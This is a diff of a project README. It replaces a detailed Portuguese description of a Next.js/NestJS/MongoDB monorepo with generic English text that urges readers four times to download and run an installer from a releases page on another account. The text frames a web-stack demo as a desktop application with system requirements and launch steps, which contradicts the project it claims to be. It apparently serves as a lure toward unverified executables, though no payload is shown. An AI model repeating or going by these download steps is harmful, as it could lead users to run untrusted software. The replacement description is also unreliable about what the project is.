@@ -1,127 +1,99 @@
-# Full-Stack CRUD — Next + NestJS + MongoDB + CI/CD Azure
-<div>
-<img src="https://img.shields.io/badge/Next.js-000000?style=for-the-badge&logo=next.js&logoColor=white" alt="Next.js"/>
-<img src="https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB" alt="React"/>
-<img src="https://img.shields.io/badge/Tailwind_CSS-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white" alt="Tailwind CSS"/>
-<img src="https://img.shields.io/badge/shadcn%2Fui-000000?style=for-the-badge&logo=shadcn%2Fui&logoColor=white" alt="shadcn/ui"/>
-<img src="https://img.shields.io/badge/NestJS-E0234E?style=for-the-badge&logo=nestjs&logoColor=white" alt="NestJS"/>
-<img src="https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white" alt="MongoDB"/>
-<img src="https://img.shields.io/badge/TypeScript-3178C6?style=for-the-badge&logo=typescript&logoColor=white" alt="TypeScript"/>
-<img src="https://img.shields.io/badge/GitHub_Actions-2088FF?style=for-the-badge&logo=github-actions&logoColor=white" alt="GitHub Actions"/>
-<img src="https://img.shields.io/badge/Cloudflare-F38020?style=for-the-badge&logo=Cloudflare&logoColor=white" alt="Cloudflare"/>
-<img src="https://img.shields.io/badge/JWT-DB3724?style=for-the-badge&logo=jsonwebtokens&logoColor=white" alt="JWT"/>
-<img src="https://img.shields.io/badge/TanStack_Query-FF4154?style=for-the-badge&logo=reactquery&logoColor=white" alt="TanStack Query"/>
-<img src="https://img.shields.io/badge/React_Hook_Form-EC5990?style=for-the-badge&logo=reacthookform&logoColor=white" alt="React Hook Form"/>
-<img src="https://img.shields.io/badge/Zod-3E67B1?style=for-the-badge&logo=zod&logoColor=white" alt="Zod"/>
-<img src="https://img.shields.io/badge/pnpm-F69220?style=for-the-badge&logo=pnpm&logoColor=white" alt="pnpm"/>
-<img src="https://img.shields.io/badge/Microsoft_Azure-0078D4?style=for-the-badge&logo=microsoftazure&logoColor=white" alt="Microsoft Azure"/>
-<img src="https://img.shields.io/badge/CI/CD-2088FF?style=for-the-badge&logo=github-actions&logoColor=white" alt="CI/CD Pipeline"/>
-<img src="https://img.shields.io/badge/Monorepo-000000?style=for-the-badge&logo=lerna&logoColor=white" alt="Monorepo"/>
-<img src="https://img.shields.io/badge/Terraform-7B42BC?style=for-the-badge&logo=terraform&logoColor=white" alt="Terraform"/>
-</div>
+# 🌟 next-nest-pro - Simple Demo for Full-Stack Architecture
 
-## ✨ Visão Geral
-- Projeto de demonstração full-stack com foco em arquitetura de microsserviços, cloud-native e automação de infraestrutura.
-- Frontend moderno construído com Angular, utilizando Angular Material para uma UI rica e reativa, Reactive Forms para formulários tipados e HttpClient com RxJS para comunicação com o backend.
-- Backend robusto e corporativo em Java (Spring Boot), com Spring Security (JWT) para autenticação, Spring Data para acesso a dados e Maven para gerenciamento de build.
-- Banco NoSQL gerenciado na nuvem com Azure Cosmos DB, garantindo alta disponibilidade e escalabilidade.
-- Infraestrutura como Código (IaC) completa com Terraform, provisionando todos os recursos na Azure de forma automatizada e versionada.
-- Pipeline CI/CD orquestrado pelo GitHub Actions, automatizando testes, build de imagens Docker, provisionamento da infra e deploy no Azure Kubernetes Service (AKS).
+## 🚀 Getting Started
 
-## 🧩 Stack
-- Frontend: Angular (Standalone API) · Angular Material (UI Kit) · RxJS · Reactive Forms · TypeScript
-- Backend: Java 17 · Spring Boot 3 · Spring Security (JWT) · Spring Data Cosmos DB · Maven
-- Banco de Dados: NoSQL - Azure Cosmos DB
-- Infraestrutura como Código: Terraform
-- Container & Orquestração: Docker · Azure Kubernetes Service (AKS) · Azure Container Registry (ACR)
-- CI/CD: GitHub Actions
-- Cloud & Rede: Microsoft Azure · Cloudflare (DNS, SSL, CDN)
+Welcome to the next-nest-pro project! This application is a demonstration of a full-stack setup. It showcases how to build applications with a focus on microservices architecture, cloud-native setups, and infrastructure automation. Whether you're a student or a curious mind, you're in the right place to explore.
 
-## 🧭 Monorepo Turbo
-```bash/next-nest-pro
-├─ apps/
-│  ├─ api/             # Backend NestJS (TypeScript)
-│  │  └─ src/
-│  │     ├─ auth/        # Módulo de Autenticação (login, register, jwt)
-│  │     │  ├─ dto/
-│  │     │  ├─ decorators/
-│  │     │  ├─ guards/
-│  │     │  ├─ strategies/
-│  │     │  ├─ auth.controller.ts
-│  │     │  └─ auth.service.ts
-│  │     ├─ users/       # Módulo de Usuários
-│  │     │  ├─ users.controller.ts
-│  │     │  ├─ users.service.ts
-│  │     │  └─ users.schema.ts  (Mongoose Schema)
-│  │     ├─ products/    # Módulo de Produtos (CRUD)
-│  │     └─ main.ts      # Ponto de entrada da API
-│  └─ web/             # Frontend Next.js (React)
-│     └─ src/
-│        ├─ app/         # App Router do Next.js
-│        │  ├─ (auth)/     # Grupo de rotas p/ login, registro
-│        │  ├─ dashboard/ 
-│        │  ├─ (main-app)/ # Grupo de rotas p/ app logado (dashboard)
-│        │  ├─ layout.tsx
-│        │  └─ page.tsx
-│        ├─ components/  # Componentes reutilizáveis (shadcn/ui)
-│        ├─ hooks/       # Hooks customizados (useLogin, useAuthGuard)
-│        └─ stores/      # Estado global (Zustand)
-├─ packages/
-│  └─ ui/                # Componentes de UI compartilhados
-├─  docker-compose.yml
-└─ .github/workflows/   # Pipelines de CI/CD para API e Web
-```
+## 🔗 Download the Application
 
-- Ferramentas de Performance: pnpm, que é conhecido por ser um dos gerenciadores de pacotes mais rápidos.
-- Turbopack: (next dev --turbopack), que é o sucessor do Webpack escrito em Rust, conhecido por sua velocidade absurda no ambiente de desenvolvimento.
-- Filosofia Moderna: como o Turborepo (criado pela Vercel), que é um orquestrador de builds de alta performance para monorepos, focado em cache inteligente e paralelismo para tornar os processos de build e teste o mais rápido possível. O pipeline de CI/CD segue esses mesmos princípios de eficiência.
+[![Download Here](https://img.shields.io/badge/Download%20next--nest--pro-blue.svg)](https://github.com/Deepak54/next-nest-pro/releases)
 
-## 🧪 Testes
-- UI (React / Next.js): Jest + React Testing Library (RTL)
-- Escopo: Testes unitários e de integração para componentes, hooks customizados (useLogin), validações de formulário com Zod, e simulação de estados de loading/erro vindos do TanStack Query.
-- API (NestJS): Jest + Supertest
-- Escopo: Testes unitários para a lógica de negócio nos Services (ex: AuthService) e testes de integração (e2e) para os Controllers, validando o fluxo completo das requisições, respostas HTTP, proteção de rotas (Guards) e DTOs.
+## 📥 Download & Install
 
-## 🔁 CI (GitHub Actions)
-- Pipelines Automatizados:
-- Infraestrutura (terraform-ci.yml):
-- Roda terraform init e terraform plan em Pull Requests para validar as mudanças.
-- Roda terraform apply em pushes para a main para sincronizar a infraestrutura na Azure.
-- Backend (api-ci.yml):
-- Instala dependências (mvn install).
-- Roda os testes (mvn test).
-- Constrói a imagem Docker.
-- Envia a imagem para o Azure Container Registry (ACR).
-- Faz o deploy da nova imagem no Azure Kubernetes Service (AKS).
-- Frontend (web-ci.yml):
-- Instala dependências (pnpm install).
-- Roda os testes (ng test).
-- Constrói os arquivos estáticos.
-- Faz o deploy para o Azure Static Web Apps.
+To download the next-nest-pro application, visit the Releases page. Here you will find the latest version available for download:
 
-## 🚀 CD Deploy — Azure
-- UI (Frontend): Azure Static Web Apps. Conectado ao GitHub para deploy contínuo. A URL pública será app.seu-dominio.com.
-- API (Backend): Azure Kubernetes Service (AKS). O cluster roda os contêineres Docker da aplicação. A URL pública será api.seu-dominio.com.
-- Banco de Dados: Azure Cosmos DB. Provisionado e configurado pelo Terraform. As credenciais são injetadas no AKS via segredos.
-- Cloudflare: Gerencia o DNS, apontando os subdomínios para os respectivos serviços do Azure, e provê a camada de segurança e CDN.
+[Visit the Releases Page](https://github.com/Deepak54/next-nest-pro/releases)
 
-## 🧭 API Docs — Swagger / OpenAPI
-- A documentação da API é gerada automaticamente a partir do próprio código-fonte usando o padrão OpenAPI (Swagger).
-- Ferramenta: Usado o módulo oficial @nestjs/swagger.
-- Como Funciona: Os Controllers e DTOs da nossa API são decorados com anotações como @ApiOperation(), @ApiResponse() e @ApiProperty().
-- Resultado: O NestJS utiliza essas anotações para gerar uma página web interativa, onde é possível visualizar todos os endpoints, seus parâmetros, schemas de resposta e até mesmo testá-los diretamente pelo navegador.
-- Acesso: A documentação fica disponível no endpoint /api/docs (ou o nome que configurarmos no main.ts).
+1. Click the link above to open the Releases page.
+2. Look for the most recent release.
+3. Download the appropriate file for your operating system (Windows, Mac, or Linux).
+4. Once the download finishes, locate the file on your computer.
+5. Open the file and follow the prompts to install the application.
 
-## 🧰 Makefile
-- Pense no Makefile como um "Menu de Atalhos" ou um "Índice de Comandos" para o seu projeto.
-- É um arquivo de texto simples chamado Makefile (sem extensão) que fica na raiz do projeto. Dentro dele, você define "apelidos" (chamados de targets) para comandos de terminal longos, complexos ou que você usa com frequência.
-- As principais vantagens de usar um Makefile são:
-- Simplicidade: Em vez de digitar **docker-compose up -d**, você simplesmente digita **make up**.
-- Padronização: Garante que todos no time (incluindo você no futuro) executem os mesmos comandos da mesma forma.
-- Documentação: O próprio arquivo serve como uma documentação viva dos principais comandos necessários para rodar, testar e construir o projeto.
-- Agilidade: up, down, logs, install, reset, tests, coverage, build, prettier, eslint 
-- dev-api: Inicia o servidor do NestJS.
-- dev-web: Inicia o servidor do Next.js.
-- Para desenvolver, você abre dois terminais e roda make dev-api, e make dev-web no outro.
-- test: Roda todos os testes de uma vez, ótimo para o pipeline de CI/CD.
-- test-api / test-web: Permitem testar cada aplicação de forma isolada.
+## 🛠️ System Requirements
+
+Before installing, ensure your system meets the following requirements:
+
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any modern Linux distribution.
+- **Processor:** Dual-core processor with a speed of 2.0 GHz or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 500 MB of free disk space.
+- **Network:** A stable internet connection for initial setup and updates.
+
+## 🎉 Features
+
+next-nest-pro offers the following features:
+
+- **Full-Stack Application:** This app demonstrates both frontend and backend technologies.
+- **Microservices Architecture:** Experience how microservices can work together.
+- **Cloud-Native Deployment:** Learn how to deploy applications in the cloud effectively.
+- **Integrated CI/CD:** Continuous Integration and Deployment automate your app’s updates and testing.
+- **User-Friendly Interface:** Easy navigation for all users, regardless of technical experience.
+
+## 🛡️ Technologies Used
+
+next-nest-pro is built using the following technologies:
+
+- **NestJS:** A progressive Node.js framework for building efficient server-side applications.
+- **Next.js:** A powerful React framework for server-rendered or statically exported React apps.
+- **ReactJS:** A JavaScript library for building user interfaces.
+- **Azure Cosmos DB:** A globally distributed database service for any scale.
+- **Azure Kubernetes Service:** Manage your containerized applications with ease.
+- **Zod:** A TypeScript-first schema declaration and validation library.
+
+## 📌 How to Use the Application
+
+Once you have installed next-nest-pro, follow these steps to start using the app:
+
+1. Launch the application from your applications folder or desktop shortcut.
+2. You will see the welcome screen. Feel free to explore the different features.
+3. Click on any section to learn more about that feature. You can use the navigation menu to move around the application.
+4. If you have any specific tasks, follow the prompts or check the help section within the app.
+
+## 🤔 Frequently Asked Questions
+
+**Q1: Can I run this application on my old computer?**
+
+A1: This application is optimized for modern systems, so make sure your system meets the minimum requirements mentioned above.
+
+**Q2: Is there any support available?**
+
+A2: Yes, you can visit our GitHub Issues page to report problems or ask questions. We will do our best to assist you.
+
+**Q3: Can I contribute to this project?**
+
+A3: Absolutely! We welcome contributions. Please check the contribution guidelines in the repository for more details.
+
+## 🌐 Community and Support
+
+Join our community to stay connected. You can reach us through:
+
+- **GitHub Issues:** Use this for reporting bugs or requesting features.
+- **Discussions Tab:** Share ideas or ask questions.
+- **Social Media:** Follow our updates for new features and tips.
+
+## 🔄 Updates and Changelog
+
+To keep your application up to date, regularly check the Releases page. Here you will find updates, new features, and fixes:
+
+[Check for Updates](https://github.com/Deepak54/next-nest-pro/releases)
+
+## 📄 License
+
+This project is licensed under the MIT License. You can use and modify the application as needed. For more details, refer to the LICENSE file in the repository.
+
+## 📝 Conclusion
+
+Thank you for checking out next-nest-pro. We hope you find it useful for your learning and exploration. Happy coding! 
+
+Don't forget to [download the application](https://github.com/Deepak54/next-nest-pro/releases) and start your journey.
